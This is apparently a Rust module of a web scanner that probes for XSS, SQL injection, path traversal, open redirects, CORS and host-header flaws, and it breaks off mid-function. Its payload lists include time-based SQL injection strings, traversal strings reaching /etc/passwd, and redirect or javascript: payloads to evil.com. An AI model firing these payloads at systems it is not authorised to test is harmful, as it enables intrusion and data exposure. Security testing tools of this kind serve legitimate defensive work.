//! Active scanning: inject into one point at a time and judge the evidence.
//!
//! Deliberately narrow and deterministic. Each check has a stated signal and a confidence, so a
//! result can be argued with instead of trusted blindly:
//!
//! - **Reflected XSS** — a unique marker must come back in an executable context.
//! - **SQL injection** — boolean differential, error patterns with engine fingerprinting, or time-based delays.
//! - **Path traversal** — signature content (`root:x:0:0`, `[fonts]`, `Linux version`) from sensitive files.
//! - **Open redirect** — external `Location` destination or execution schemes (`javascript:`, `data:`).
//!
//! Requests go through [`crate::replay::send`], so scope, destination policy, cookie jar,
//! header preset and TLS profile all apply consistently.
//!
//! The scan is sequential with rate control and exponential backoff, stopping early once the target
//! refuses repeatedly or hits edge WAF blocks.

use std::collections::HashSet;
use std::sync::OnceLock;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::challenge;
use crate::replay::{send, ApplyConfig, ReplayOptions, ReplayRequest};
use crate::waf_detect;
use crate::xss_context;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CheckKind {
    ReflectedXss,
    SqlError,
    SqlBoolean,
    SqlTime,
    PathTraversal,
    OpenRedirect,
    OpenRedirectXss,
    CorsMisconfig,
    CrlfInjection,
    HostHeaderInjection,
    MethodOverride,
}

impl CheckKind {
    pub fn label(self) -> &'static str {
        match self {
            CheckKind::ReflectedXss => "Reflected input (possible XSS)",
            CheckKind::SqlError => "SQL error leaked",
            CheckKind::SqlBoolean => "SQL injection (boolean)",
            CheckKind::SqlTime => "SQL injection (time-based)",
            CheckKind::PathTraversal => "Path traversal",
            CheckKind::OpenRedirect => "Open redirect",
            CheckKind::OpenRedirectXss => "Open redirect -> XSS chain",
            CheckKind::CorsMisconfig => "CORS misconfiguration",
            CheckKind::CrlfInjection => "CRLF header injection",
            CheckKind::HostHeaderInjection => "Host header injection",
            CheckKind::MethodOverride => "HTTP method override",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Confidence {
    Info,
    Low,
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ActiveFinding {
    pub kind: CheckKind,
    pub confidence: Confidence,
    /// `query:name`, `body:name` or `header:name`.
    pub point: String,
    pub payload: String,
    /// What was observed, quoted for the report.
    pub evidence: String,
    pub status: u16,
    /// Reflection context for XSS findings.
    pub context: Option<String>,
    /// Database engine inferred from an error message or time-based probe.
    pub db_type: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StopReason {
    /// The target answered 403/429/503 repeatedly.
    Blocked,
    /// `max_requests` reached.
    Budget,
    /// The target kept refusing after the backoff ladder.
    RateLimited,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScanReport {
    pub findings: Vec<ActiveFinding>,
    pub requests: usize,
    pub points: usize,
    pub stopped: Option<StopReason>,
    /// The baseline was not HTML, so reflection checks were skipped.
    pub skipped_non_html: bool,
    /// The endpoint is a WAF challenge page; nothing was scanned.
    pub skipped_waf: bool,
    /// The endpoint is hard-blocked by an edge.
    pub blocked_by_waf: bool,
    /// The URL is edge infrastructure, not the application.
    pub skipped_infrastructure: bool,
    /// Vendor that interfered, for the report.
    pub waf_vendor: Option<String>,
}

#[derive(Debug, Clone)]
pub struct ScanOptions {
    pub delay: Duration,
    pub max_requests: usize,
    /// Consecutive refusals before the run stops.
    pub stop_after_blocks: usize,
    /// Sleep the 1/3/9/27 s ladder while the target keeps refusing. Off in tests.
    pub backoff: bool,
}

impl Default for ScanOptions {
    fn default() -> Self {
        ScanOptions {
            delay: Duration::from_millis(150),
            max_requests: 80,
            stop_after_blocks: 4,
            backoff: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Point {
    Query(String),
    Body(String),
    Header(String),
}

impl Point {
    pub fn label(&self) -> String {
        match self {
            Point::Query(n) => format!("query:{n}"),
            Point::Body(n) => format!("body:{n}"),
            Point::Header(n) => format!("header:{n}"),
        }
    }

    pub fn name(&self) -> &str {
        match self {
            Point::Query(n) | Point::Body(n) | Point::Header(n) => n.as_str(),
        }
    }
}

/// Headers worth injecting into. `Host`/`Content-Length` are recomputed, `Cookie` belongs to the
/// jar, and `User-Agent`/`Accept-Encoding` are owned by the preset.
const SKIP_HEADERS: &[&str] = &[
    "host",
    "cookie",
    "content-length",
    "content-type",
    "user-agent",
    "accept-encoding",
    "connection",
];

/// Points that are almost never interpreted by the application.
const SKIP_PARAMS: &[&str] = &["__viewstate", "__eventvalidation", "__eventargument"];

fn is_form_body(req: &ReplayRequest) -> bool {
    req.headers.iter().any(|(n, v)| {
        n.eq_ignore_ascii_case("content-type")
            && v.to_ascii_lowercase().contains("x-www-form-urlencoded")
    })
}

/// Every injectable point, in a stable order: query, body, then headers.
pub fn insertion_points(req: &ReplayRequest) -> Vec<Point> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();

    if let Some((_, query)) = req.url.split_once('?') {
        for pair in query.split('&') {
            if let Some((name, _)) = pair.split_once('=') {
                let name = name.trim();
                if name.is_empty() || SKIP_PARAMS.contains(&name.to_ascii_lowercase().as_str()) {
                    continue;
                }
                if seen.insert(format!("q:{name}")) {
                    out.push(Point::Query(name.to_string()));
                }
            }
        }
    }

    if is_form_body(req) {
        for pair in req.body.split('&') {
            if let Some((name, _)) = pair.split_once('=') {
                let name = name.trim();
                if name.is_empty() || SKIP_PARAMS.contains(&name.to_ascii_lowercase().as_str()) {
                    continue;
                }
                if seen.insert(format!("b:{name}")) {
                    out.push(Point::Body(name.to_string()));
                }
            }
        }
    }

    for (name, _) in &req.headers {
        let lower = name.to_ascii_lowercase();
        if SKIP_HEADERS.contains(&lower.as_str()) || !seen.insert(format!("h:{lower}")) {
            continue;
        }
        out.push(Point::Header(name.clone()));
    }

    out
}

fn encode_query(value: &str) -> String {
    let mut out = String::new();
    for b in value.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Replace the point's value with `payload`, keeping everything else byte-identical.
fn with_payload(req: &ReplayRequest, point: &Point, payload: &str) -> ReplayRequest {
    let mut out = req.clone();
    match point {
        Point::Query(name) => {
            let (base, query) = out.url.split_once('?').unwrap_or((out.url.as_str(), ""));
            let mut replaced = false;
            let mut rebuilt: Vec<String> = query
                .split('&')
                .filter(|pair| !pair.is_empty())
                .map(|pair| match pair.split_once('=') {
                    Some((n, _)) if n.trim() == name => {
                        replaced = true;
                        format!("{n}={}", encode_query(payload))
                    }
                    _ => pair.to_string(),
                })
                .collect();
            if !replaced {
                rebuilt.push(format!("{name}={}", encode_query(payload)));
            }
            out.url = format!("{base}?{}", rebuilt.join("&"));
        }
        Point::Body(name) => {
            let rebuilt: Vec<String> = out
                .body
                .split('&')
                .map(|pair| match pair.split_once('=') {
                    Some((n, _)) if n.trim() == name => format!("{n}={}", encode_query(payload)),
                    _ => pair.to_string(),
                })
                .collect();
            out.body = rebuilt.join("&");
        }
        Point::Header(name) => {
            for (n, v) in out.headers.iter_mut() {
                if n.eq_ignore_ascii_case(name) {
                    *v = payload.to_string();
                }
            }
        }
    }
    out
}

const SQL_PAYLOADS: &[&str] = &["'", "\"", "')", "' OR '1'='1"];

/// Boolean test pair: true vs false.
const BOOLEAN_PAIR: (&str, &str) = ("1' AND '1'='1", "1' AND '1'='2");

/// (db_engine, sleep_payload, nosleep_payload)
const TIME_PAYLOADS: &[(&str, &str, &str)] = &[
    ("mysql", "' OR SLEEP(3)-- -", "' OR SLEEP(0)-- -"),
    (
        "postgresql",
        "'; SELECT pg_sleep(3)--",
        "'; SELECT pg_sleep(0)--",
    ),
    (
        "mssql",
        "'; WAITFOR DELAY '0:0:3'--",
        "'; WAITFOR DELAY '0:0:0'--",
    ),
];

const DB_FINGERPRINTS: &[(&str, &str)] = &[
    ("you have an error in your sql syntax", "mysql"),
    ("mysql_fetch", "mysql"),
    ("mysqlexception", "mysql"),
    ("syntax error at or near", "postgresql"),
    ("pg::syntaxerror", "postgresql"),
    ("incorrect syntax near", "mssql"),
    ("sqlexception", "mssql"),
    ("ora-00933", "oracle"),
    ("ora-00921", "oracle"),
    ("ora-01756", "oracle"),
    ("sqlite3::exception", "sqlite"),
    ("syntax error near", "sqlite"),
];

const ALL_TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    r"..\..\..\windows\win.ini",
    r"....\/....\/....\/windows\win.ini",
    "/etc/passwd",
    "/etc/hostname",
    r"C:\Windows\win.ini",
    r"C:\boot.ini",
];

const TRAVERSAL_PRIORITY_PARAMS: &[&str] = &[
    "file", "path", "page", "doc", "download", "template", "include", "load", "read", "view",
    "src", "url", "target", "dir", "folder",
];

const REDIRECT_PAYLOADS: &[&str] = &[
    "//evil.com",
    r"\/\/evil.com",
    "https:evil.com",
    "https://legit.com@evil.com",
    "https://legit.com#@evil.com",
    r"https://legit.com\.evil.com",
    "https://evil.com%2f@legit.com",
    "//evil.com/%2f..",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
];

const SQL_ERRORS: &[&str] = &[
    "you have an error in your sql syntax",
    "sql syntax",
    "mysql_fetch",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ora-0",
    "psql:",
    "sqlstate",
    "microsoft ole db provider for sql server",
    "syntax error at or near",
];

fn body_text(resp: &crate::replay::ReplayResponse) -> String {
    String::from_utf8_lossy(&resp.message).to_string()
}

fn has_sql_error(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    SQL_ERRORS.iter().any(|m| lower.contains(m))
}

fn fingerprint_db(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    DB_FINGERPRINTS
        .iter()
        .find(|(marker, _)| lower.contains(marker))
        .map(|(_, db)| db.to_string())
}

fn normalize_body(text: &str) -> String {
    static LONG_NUM: OnceLock<regex::Regex> = OnceLock::new();
    static HEX: OnceLock<regex::Regex> = OnceLock::new();
    let num = LONG_NUM.get_or_init(|| regex::Regex::new(r"\d{10,13}").expect("static regex"));
    let hex = HEX.get_or_init(|| regex::Regex::new(r"[a-fA-F0-9]{16,}").expect("static regex"));
    hex.replace_all(&num.replace_all(text, "N"), "H")
        .to_string()
}

fn median(samples: &[u128]) -> u128 {
    if samples.is_empty() {
        return 0;
    }
    let mut sorted = samples.to_vec();
    sorted.sort_unstable();
    sorted[sorted.len() / 2]
}

fn location_of(resp: &crate::replay::ReplayResponse) -> Option<&str> {
    resp.headers
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case("location"))
        .map(|(_, v)| v.as_str())
}

fn decode_url(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(b) =
                u8::from_str_radix(std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap_or(""), 16)
            {
                out.push(b);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).to_string()
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://")?.1;
    let authority = rest.split(['/', '?', '#']).next()?;
    Some(
        authority
            .rsplit_once('@')
            .map(|(_, h)| h)
            .unwrap_or(authority)
            .split(':')
            .next()?
            .to_ascii_lowercase(),
    )
}

fn is_refusal(resp: &crate::replay::ReplayResponse) -> bool {
    matches!(resp.status, 403 | 429 | 503)
        || challenge::detect(resp.status, &resp.headers, &resp.message).is_some()
}

fn downgrade(c: Confidence) -> Confidence {
    match c {
        Confidence::High => Confidence::Medium,
        Confidence::Medium => Confidence::Low,
        Confidence::Low | Confidence::Info => Confidence::Info,
    }
}

fn is_html(headers: &[(String, String)]) -> bool {
    headers
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case("content-type"))
        .map(|(_, v)| {
            let v = v.to_ascii_lowercase();
            v.contains("text/html") || v.contains("application/xhtml")
        })
        .unwrap_or(false)
}

/// Discover query/form parameter names from baseline HTML (`name="..."` on form controls and
/// `?param=` in links/actions), falling back to standard query parameters when a bare URL has no
/// explicit insertion points.
fn discover_html_points(html: &str) -> Vec<Point> {
    static INPUT_NAME: OnceLock<regex::Regex> = OnceLock::new();
    static HREF_QUERY: OnceLock<regex::Regex> = OnceLock::new();
    let input_re = INPUT_NAME.get_or_init(|| {
        regex::Regex::new(r#"(?i)<(?:input|select|textarea)\b[^>]*?\bname\s*=\s*["']([a-zA-Z0-9_\-\.]{1,48})["']"#)
            .expect("static regex")
    });
    let href_re = HREF_QUERY.get_or_init(|| {
        regex::Regex::new(r#"(?i)(?:href|action)\s*=\s*["'][^"'#?]*\?([^"'#]+)["']"#)
            .expect("static regex")
    });

    let mut out = Vec::new();
    let mut seen = HashSet::new();

    for cap in href_re.captures_iter(html) {
        if let Some(q) = cap.get(1) {
            for pair in q.as_str().split(&['&', ';'][..]) {
                let name = pair.split('=').next().unwrap_or("").trim();
                if !name.is_empty()
                    && !name.starts_with("amp;")
                    && !SKIP_PARAMS.contains(&name.to_ascii_lowercase().as_str())
                    && seen.insert(name.to_ascii_lowercase())
                {
                    out.push(Point::Query(name.to_string()));
                    if out.len() >= 6 {
                        return out;
                    }
                }
            }
        }
    }

    for cap in input_re.captures_iter(html) {
        if let Some(m) = cap.get(1) {
            let name = m.as_str().trim();
            if !name.is_empty()
                && !SKIP_PARAMS.contains(&name.to_ascii_lowercase().as_str())
                && seen.insert(name.to_ascii_lowercase())
            {
                out.push(Point::Query(name.to_string()));
                if out.len() >= 6 {
                    return out;
                }
            }
        }
    }

    if out.is_empty() {
        for fallback in ["s", "q", "id", "page", "url"] {
            out.push(Point::Query(fallback.to_string()));
        }
    }
    out
}

/// Run the active scan. Sequential, bounded, and stops when the target starts refusing.
pub async fn scan(
    req: &ReplayRequest,
    apply: &ApplyConfig,
    replay_opts: &ReplayOptions,
    opts: &ScanOptions,
) -> ScanReport {
    let mut points = insertion_points(req);
    let mut report = ScanReport {
        points: points.len(),
        ..Default::default()
    };

    if waf_detect::is_infrastructure_path(&req.url) {
        report.skipped_infrastructure = true;
        return report;
    }

    if report.requests >= opts.max_requests {
        report.stopped = Some(StopReason::Budget);
        return report;
    }

    let mut options = replay_opts.clone();
    options.apply = apply.clone();

    let baseline = match send(req, &options).await {
        Ok(r) => r,
        Err(_) => {
            report.stopped = Some(StopReason::Blocked);
            return report;
        }
    };
    report.requests += 1;
    let baseline_text = body_text(&baseline);
    let baseline_sql = has_sql_error(&baseline_text);
    let baseline_host = host_of(&req.url).unwrap_or_default();

    match waf_detect::detect(&baseline.headers, &baseline_text, baseline.status) {
        waf_detect::WafSignal::Challenge(vendor) => {
            report.skipped_waf = true;
            report.waf_vendor = Some(vendor.label().to_string());
            return report;
        }
        waf_detect::WafSignal::Block(vendor) => {
            report.blocked_by_waf = true;
            report.waf_vendor = Some(vendor.label().to_string());
            return report;
        }
        waf_detect::WafSignal::None => {}
    }

    let skipped_non_html = !is_html(&baseline.headers);
    report.skipped_non_html = skipped_non_html;

    if points.is_empty() && !is_refusal(&baseline) {
        points = discover_html_points(&baseline_text);
        report.points = points.len();
    }

    let mut blocks = 0usize;
    let mut retries = 0usize;
    let mut found: HashSet<(CheckKind, String)> = HashSet::new();

    // --- Endpoint-level Checks: CORS, Host header, Method Override ----------------------
    // 1. CORS misconfiguration check
    if report.requests < opts.max_requests {
        let mut cors_req = req.clone();
        cors_req
            .headers
            .retain(|(n, _)| !n.eq_ignore_ascii_case("origin"));
        cors_req
            .headers
            .push(("Origin".into(), "https://evil.example".into()));
        report.requests += 1;
        if let Ok(resp) = send(&cors_req, &options).await {
            let acao = resp
                .headers
                .iter()
                .find(|(n, _)| n.eq_ignore_ascii_case("access-control-allow-origin"))
                .map(|(_, v)| v.as_str());
            if let Some(origin) = acao {
                if origin == "https://evil.example" || origin == "*" {
                    let creds = resp.headers.iter().any(|(n, v)| {
                        n.eq_ignore_ascii_case("access-control-allow-credentials")
                            && v.eq_ignore_ascii_case("true")
                    });
                    let confidence = if creds {
                        Confidence::High
                    } else {
                        Confidence::Medium
                    };
                    let evidence = format!(
                        "Origin: https://evil.example reflected in ACAO: {origin}{}",
                        if creds { " with ACAC: true" } else { "" }
                    );
                    if found.insert((CheckKind::CorsMisconfig, "header:Origin".into())) {
                        report.findings.push(ActiveFinding {
                            kind: CheckKind::CorsMisconfig,
                            confidence,
                            point: "header:Origin".into(),
                            payload: "https://evil.example".into(),
                            evidence,
                            status: resp.status,
                            context: None,
                            db_type: None,
                        });
                    }
                }
            }
        }
    }

    // 2. Host header injection via X-Forwarded-Host
    if report.requests < opts.max_requests {
        let mut xfh_req = req.clone();
        xfh_req
            .headers
            .retain(|(n, _)| !n.eq_ignore_ascii_case("x-forwarded-host"));
        xfh_req
            .headers
            .push(("X-Forwarded-Host".into(), "evil.example".into()));
        report.requests += 1;
        if let Ok(resp) = send(&xfh_req, &options).await {
            let body = body_text(&resp);
            let loc = location_of(&resp);
            let reflected_body = body.contains("evil.example");
            let reflected_loc = loc.is_some_and(|l| l.contains("evil.example"));
            if reflected_body || reflected_loc {
                let evidence = if reflected_loc {
                    format!(
                        "X-Forwarded-Host reflected in Location: {}",
                        loc.unwrap_or("")
                    )
                } else {
                    "X-Forwarded-Host reflected in response body".to_string()
                };
                if found.insert((
                    CheckKind::HostHeaderInjection,
                    "header:X-Forwarded-Host".into(),
                )) {
                    report.findings.push(ActiveFinding {
                        kind: CheckKind::HostHeaderInjection,
                        confidence: Confidence::Medium,
                        point: "header:X-Forwarded-Host".into(),
                        payload: "evil.example".into(),
                        evidence,
                        status: resp.status,
                        context: None,
                        db_type: None,
                    });
                }
            }
        }
    }

    // 3. HTTP method override
    if req.method.eq_ignore_ascii_case("GET") && report.requests < opts.max_requests {
        let mut override_req = req.clone();
        override_req
            .headers
            .retain(|(n, _)| !n.eq_ignore_ascii_case("x-http-method-override"));
        override_req
            .headers
            .push(("X-HTTP-Method-Override".into(), "DELETE".into()));
        report.requests += 1;
        if let Ok(resp) = send(&override_req, &options).await {
            let n_override = normalize_body(&body_text(&resp));
            let n_base = normalize_body(&baseline_text);
            let differs = resp.status != baseline.status
                || (n_override != n_base
                    && (n_override.len() as f64 - n_base.len() as f64).abs()
                        > 0.05 * (n_base.len().max(n_override.len()) as f64));
            if differs
                && !is_refusal(&resp)
                && found.insert((
                    CheckKind::MethodOverride,
                    "header:X-HTTP-Method-Override".into(),
                ))
            {
                report.findings.push(ActiveFinding {
                    kind: CheckKind::MethodOverride,
                    confidence: Confidence::Medium,
                    point: "header:X-HTTP-Method-Override".into(),
                    payload: "DELETE".into(),
                    evidence: format!(
                        "Status {} vs baseline {}, body differs with override",
                        resp.status, baseline.status
                    ),
                    status: resp.status,
                    context: None,
                    db_type: None,
                });
            }
        }
    }

    if report.requests >= opts.max_requests {
        if report.stopped.is_none() {
            report.stopped = Some(StopReason::Budget);
        }
        report
            .findings
            .sort_by(|a, b| b.confidence.cmp(&a.confidence).then(a.point.cmp(&b.point)));
        return report;
    }

    'outer: for point in &points {
        let label = point.label();

        if report.requests >= opts.max_requests {
            if report.stopped.is_none() {
                report.stopped = Some(StopReason::Budget);
            }
            break 'outer;
        }

        if blocks >= 3 {
            retries += 1;
            if retries > 5 {
                report.stopped = Some(StopReason::RateLimited);
                break;
            }
            if opts.backoff {
                let secs = 3u64.pow((blocks - 3).min(3) as u32);
                tokio::time::sleep(Duration::from_secs(secs)).await;
            }
        }

        // --- Reflected XSS -----------------------------------------------------------------
        if !skipped_non_html {
            if report.requests >= opts.max_requests {
                if report.stopped.is_none() {
                    report.stopped = Some(StopReason::Budget);
                }
                break 'outer;
            }
            let marker = format!("dsx{}", short_token());
            if let Ok(resp) = probe(
                req,
                &options,
                point,
                &format!("<{marker}>"),
                &mut report,
                opts.max_requests,
            )
            .await
            {
                if is_refusal(&resp) {
                    blocks += 1;
                } else {
                    blocks = 0;
                    let text = body_text(&resp);
                    if let Some(offset) = text.find(&marker) {
                        let context = xss_context::classify(&text, offset);
                        let encoding = xss_context::encoding_of(&text, &marker);
                        let mut confidence = match (encoding, context) {
                            (
                                Some(xss_context::Encoding::Verbatim),
                                xss_context::ReflectionContext::HtmlBody,
                            )
                            | (
                                Some(xss_context::Encoding::Verbatim),
                                xss_context::ReflectionContext::Text,
                            ) => Confidence::High,
                            (Some(xss_context::Encoding::Verbatim), _) => Confidence::Medium,
                            (Some(xss_context::Encoding::Partial), _) => Confidence::Low,
                            (Some(xss_context::Encoding::Full), _) => Confidence::Info,
                            (None, _) => Confidence::Low,
                        };

                        let mut payload = format!("<{marker}>");
                        let mut confirmed = false;
                        if let Some(breakout) = context.breakout_payload() {
                            let probe_payload =
                                breakout.replace("alert(1)", &format!("alert(\"{marker}\")"));
                            if report.requests < opts.max_requests {
                                if let Ok(confirm) = probe(
                                    req,
                                    &options,
                                    point,
                                    &probe_payload,
                                    &mut report,
                                    opts.max_requests,
                                )
                                .await
                                {
                                    confirmed = body_text(&confirm).contains(&probe_payload);
                                }
                            } else if report.stopped.is_none() {
                                report.stopped = Some(StopReason::Budget);
                            }
                            payload = probe_payload;
                        }
                        if !confirmed {
                            confidence = downgrade(confidence);
                        }

                        if found.insert((CheckKind::ReflectedXss, label.clone())) {
                            report.findings.push(ActiveFinding {
                                kind: CheckKind::ReflectedXss,
                                confidence,
                                point: label.clone(),
                                payload,
                                evidence: format!(
                                    "reflected in {} context ({}){}",
                                    context.label(),
                                    match encoding {
                                        Some(xss_context::Encoding::Verbatim) =>
                                            "metacharacters intact",
                                        Some(xss_context::Encoding::Partial) =>
                                            "marker only, brackets lost",
                                        Some(xss_context::Encoding::Full) => "fully entity-encoded",
                                        None => "marker present",
                                    },
                                    if confirmed {
                                        ", breakout payload reflected"
                                    } else {
                                        ", breakout not reflected"
                                    }
                                ),
                                status: resp.status,
                                context: Some(context.label().to_string()),
                                db_type: None,
                            });
                        }
                    }
                }
            }
        }

        // --- SQL Injection: Boolean-based -> Error-based -> Time-based ---------------------
        let mut sql_found = false;

        // 1. Boolean-based
        if report.requests + 2 <= opts.max_requests {
            let (tp, fp) = BOOLEAN_PAIR;
            if let (Ok(rt), Ok(rf)) = (
                probe(req, &options, point, tp, &mut report, opts.max_requests).await,
                probe(req, &options, point, fp, &mut report, opts.max_requests).await,
            ) {
                if !is_refusal(&rt) && !is_refusal(&rf) {
                    let nt = normalize_body(&body_text(&rt));
                    let nf = normalize_body(&body_text(&rf));
                    let len_diff = (nt.len() as f64 - nf.len() as f64).abs();
                    let max_len = (nt.len().max(nf.len())) as f64;
                    let differs = nt != nf
                        && (rt.status != rf.status || (max_len > 0.0 && len_diff / max_len > 0.05));

                    if differs {
                        let mut confirmed = 0;
                        for _ in 0..2 {
                            if report.requests + 2 > opts.max_requests {
                                if report.stopped.is_none() {
                                    report.stopped = Some(StopReason::Budget);
                                }
                                break;
                            }
                            if let (Ok(c_t), Ok(c_f)) = (
                                probe(req, &options, point, tp, &mut report, opts.max_requests).await,
                                probe(req, &options, point, fp, &mut report, opts.max_requests).await,
                            ) {
                                let c_nt = normalize_body(&body_text(&c_t));
                                let c_nf = normalize_body(&body_text(&c_f));
                                if c_nt != c_nf {
                                    confirmed += 1;
                                }
                            }
                        }
                        let confidence = if confirmed == 2 {
                            Confidence::High
                        } else {
                            Confidence::Medium
                        };

                        if found.insert((CheckKind::SqlBoolean, label.clone())) {
                            report.findings.push(ActiveFinding {
                                kind: CheckKind::SqlBoolean,
                                confidence,
                                point: label.clone(),
                                payload: tp.to_string(),
                                evidence: format!(
                                    "TRUE and FALSE conditions produced differing responses (confirmed {confirmed}/2)"
                                ),
                                status: rt.status,
                                context: None,
                                db_type: None,
                            });
                            sql_found = true;
                        }
                    }
                }
            }
        }

        // 2. Error-based
        for payload in SQL_PAYLOADS {
            if report.requests >= opts.max_requests {
                if report.stopped.is_none() {
                    report.stopped = Some(StopReason::Budget);
                }
                break 'outer;
            }
            let Ok(resp) = probe(req, &options, point, payload, &mut report, opts.max_requests).await else {
                continue;
            };
            if is_refusal(&resp) {
                blocks += 1;
                if blocks >= opts.stop_after_blocks {
                    report.stopped = Some(StopReason::Blocked);
                    break 'outer;
                }
                continue;
            }
            blocks = 0;
            let text = body_text(&resp);
            if has_sql_error(&text) && !baseline_sql {
                let db = fingerprint_db(&text);
                if found.insert((CheckKind::SqlError, label.clone())) {
                    report.findings.push(ActiveFinding {
                        kind: CheckKind::SqlError,
                        confidence: Confidence::High,
                        point: label.clone(),
                        payload: payload.to_string(),
                        evidence: quote_error(&text),
                        status: resp.status,
                        context: None,
                        db_type: db,
                    });
                    sql_found = true;
                }
                break;
            }
        }

        // 3. Time-based (fallback when boolean & error inconclusive)
        if !sql_found && report.requests + 8 <= opts.max_requests {
            let mut base_samples = vec![baseline.duration_ms as u128];
            for _ in 0..2 {
                if report.requests >= opts.max_requests {
                    if report.stopped.is_none() {
                        report.stopped = Some(StopReason::Budget);
                    }
                    break;
                }
                if let Ok(r) = probe(req, &options, point, "1", &mut report, opts.max_requests).await {
                    base_samples.push(r.duration_ms as u128);
                }
            }
            let base_med = median(&base_samples);

            'time_loop: for &(db, sleep_p, nosleep_p) in TIME_PAYLOADS {
                if report.requests + 6 > opts.max_requests {
                    if report.stopped.is_none() {
                        report.stopped = Some(StopReason::Budget);
                    }
                    break 'outer;
                }

                let mut sleep_samples = Vec::new();
                let mut nosleep_samples = Vec::new();

                for _ in 0..3 {
                    if report.requests + 2 > opts.max_requests {
                        if report.stopped.is_none() {
                            report.stopped = Some(StopReason::Budget);
                        }
                        break 'time_loop;
                    }
                    if let Ok(r) = probe(req, &options, point, sleep_p, &mut report, opts.max_requests).await {
                        sleep_samples.push(r.duration_ms as u128);
                    }
                    if let Ok(r) = probe(req, &options, point, nosleep_p, &mut report, opts.max_requests).await {
                        nosleep_samples.push(r.duration_ms as u128);
                    }
                }

                let sleep_med = median(&sleep_samples);
                let nosleep_med = median(&nosleep_samples);

                if sleep_med > base_med + 2500 && nosleep_med < base_med + 500 {
                    if found.insert((CheckKind::SqlTime, label.clone())) {
                        report.findings.push(ActiveFinding {
                            kind: CheckKind::SqlTime,
                            confidence: Confidence::High,
                            point: label.clone(),
                            payload: sleep_p.to_string(),
                            evidence: format!(
                                "sleep median {sleep_med}ms vs nosleep median {nosleep_med}ms (baseline {base_med}ms)"
                            ),
                            status: 200,
                            context: None,
                            db_type: Some(db.to_string()),
                        });
                    }
                    break 'time_loop;
                }
            }
        }

        // --- Path Traversal ----------------------------------------------------------------
        let param_name_lower = point.name().to_ascii_lowercase();
        let is_prioritized = TRAVERSAL_PRIORITY_PARAMS
            .iter()
            .any(|p| param_name_lower.contains(p));
        let traversal_payloads: &[&str] = if is_prioritized {
            ALL_TRAVERSAL_PAYLOADS
        } else {
            &ALL_TRAVERSAL_PAYLOADS[..3]
        };

        for payload in traversal_payloads {
            if report.requests >= opts.max_requests {
                if report.stopped.is_none() {
                    report.stopped = Some(StopReason::Budget);
                }
                break 'outer;
            }
            let Ok(resp) = probe(req, &options, point, payload, &mut report, opts.max_requests).await else {
                continue;
            };
            if is_refusal(&resp) {
                blocks += 1;
                if blocks >= opts.stop_after_blocks {
                    report.stopped = Some(StopReason::Blocked);
                    break 'outer;
                }
                continue;
            }
            blocks = 0;
            let text = body_text(&resp);
            let hit_passwd = text.contains("root:x:0:0") && !baseline_text.contains("root:x:0:0");
            let hit_win = (text.contains("[fonts]") || text.contains("[extensions]"))
                && !baseline_text.contains("[fonts]");
            let hit_hostname =
                text.contains("Linux version") && !baseline_text.contains("Linux version");
            let hit_boot =
                text.contains("[boot loader]") && !baseline_text.contains("[boot loader]");

            if hit_passwd || hit_win || hit_hostname || hit_boot {
                let evidence = if hit_passwd {
                    "passwd content returned (root:x:0:0)".to_string()
                } else if hit_win {
                    "win.ini content returned ([fonts]/[extensions])".to_string()
                } else if hit_hostname {
                    "version content returned (Linux version)".to_string()
                } else {
                    "boot.ini content returned ([boot loader])".to_string()
                };

                if found.insert((CheckKind::PathTraversal, label.clone())) {
                    report.findings.push(ActiveFinding {
                        kind: CheckKind::PathTraversal,
                        confidence: Confidence::High,
                        point: label.clone(),
                        payload: payload.to_string(),
                        evidence,
                        status: resp.status,
                        context: None,
                        db_type: None,
                    });
                }
                break;
            }
        }

        // --- Open Redirect -----------------------------------------------------------------
        let mut redirect_found = false;
        let mut redirect_xss_found = false;

        for payload in REDIRECT_PAYLOADS {
            if (redirect_found && redirect_xss_found) || report.requests >= opts.max_requests {
                if report.requests >= opts.max_requests && report.stopped.is_none() {
                    report.stopped = Some(StopReason::Budget);
                    break 'outer;
                }
                break;
            }
            let Ok(resp) = probe(req, &options, point, payload, &mut report, opts.max_requests).await else {
                continue;
            };
            if is_refusal(&resp) {
                blocks += 1;
                if blocks >= opts.stop_after_blocks {
                    report.stopped = Some(StopReason::Blocked);
                    break 'outer;
                }
                continue;
            }
            blocks = 0;
            if !(300..400).contains(&resp.status) {
                continue;
            }
            let Some(raw_location) = location_of(&resp) else {
                continue;
            };
            let decoded_location = decode_url(raw_location);
            let lower_loc = decoded_location.trim().to_ascii_lowercase();

            // Scheme-based XSS check: javascript: or data:
            if (lower_loc.starts_with("javascript:") || lower_loc.starts_with("data:"))
                && !redirect_xss_found
            {
